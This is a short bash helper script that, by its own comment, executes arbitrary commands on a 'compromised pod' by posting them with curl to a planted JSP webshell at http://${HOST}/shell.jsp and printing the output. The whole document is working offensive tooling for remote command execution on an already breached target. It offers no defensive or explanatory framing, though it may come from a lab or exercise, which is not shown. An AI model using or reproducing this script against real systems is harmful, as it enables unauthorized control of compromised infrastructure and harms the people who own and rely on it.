#!/bin/bash
###############################################
# Helper: execute arbitrary commands on the
# compromised pod via the webshell
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
[ $# -lt 1 ] && echo "Usage: $0 <command>" && exit 1

COMMAND="$@"
echo "[+] Executing: $COMMAND"
curl -s --data-urlencode "cmd=$COMMAND" "http://${HOST}/shell.jsp" | tr -d '\0'
echo ""
